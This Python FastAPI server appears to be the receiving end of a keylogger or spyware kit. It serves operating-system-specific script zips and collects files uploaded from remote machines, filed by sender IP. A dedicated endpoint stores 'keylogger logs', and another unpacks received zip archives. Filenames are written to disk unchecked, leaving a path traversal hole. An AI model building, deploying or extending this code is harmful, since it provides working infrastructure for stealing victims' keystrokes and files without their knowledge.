import uvicorn # to launch the server
import os # anything related to folders and files
import mimetypes # to get mimetypes
from zipfile import ZipFile # to deal with zip files
from fastapi import FastAPI, Request, UploadFile, File # to make the server work
from fastapi.responses import FileResponse # to send script zips
from typing import List # to make file receiving work
from datetime import datetime, timezone # anything related to classification by time

app = FastAPI() # make the server

zip_location = {'win':'resources/win_scripts.zip',
                'linux':'resources/linux_scripts.zip',
                'darwin':'resources/darwin_scripts.zip'}

@app.get("/scripts")
async def scripts_zip(request: Request): # send the script zips
    headers = request.headers
    if 'win' in headers['os']:
        return FileResponse(zip_location['win'], media_type='application/zip', filename=zip_location['win'])
    elif 'linux' in headers['os']:
        return FileResponse(zip_location['linux'], media_type='application/zip', filename=zip_location['linux'])
    elif 'darwin' in headers['os']:
        return FileResponse(zip_location['darwin'], media_type='application/zip', filename=zip_location['darwin'])

@app.post("/")
async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
    IP = request.client.host # get the IP
    os.makedirs(IP, exist_ok=True) # make a directory for the IP that sent the file for organization
    for file in files: # go through all the files sent
        type = file.content_type.replace('/','-')
        contents = await file.read() # get the file contents
        os.makedirs(f"{IP}/{type}", exist_ok=True) # make a directory for the file type for organization
        with open(f"{IP}/{type}/{file.filename}", "wb") as f: # write the file contents in bytes
            f.write(contents)

@app.post("/log")
async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to receive keylogger logs
    IP = request.client.host # get IP
    os.makedirs(IP, exist_ok=True) # make a directory for the IP that sent the file for organization
    os.makedirs(f"{IP}/keylogger-log", exist_ok=True) # make a directory for keylogger logs for organization
    contents = await file.read() # get file contents
    with open(f"{IP}/keylogger-log/{file.filename}", 'wb') as f: # write the file contents in bytes
        f.write(contents)

@app.post("/zip")
async def handle_zip(request: Request, file: UploadFile = File(...)): # to recieve zip files you want to unpack
    IP = request.client.host  # get IP
    os.makedirs(IP, exist_ok=True)  # make a directory for the IP that sent the file for organization
    zip_name = f"{IP}/{file.filename}" # make the zip name so its placed in a folder of the IP that sent it
    with open(zip_name, "wb") as zip:
        zip.write(await file.read()) # make the zip file that was received
    with ZipFile(zip_name, 'r') as zip:
        files = zip.namelist() # get the list of files in the zip
        for file in files:
            file_type = mimetypes.guess_type(file)[0].replace('/', '-') # get the file type for the file
            os.makedirs(f"{IP}/{file_type}", exist_ok=True)  # make a directory for the file type for organization
            with open(f"{IP}/{file_type}/{file}", 'wb') as f:
                f.write(zip.read(file)) # put the contents of the file in the zip into the file you're making outside of the zip
    os.remove(zip_name) # remove the zip file you went through to avoid clutter


uvicorn.run(app, host="0.0.0.0", port=8000)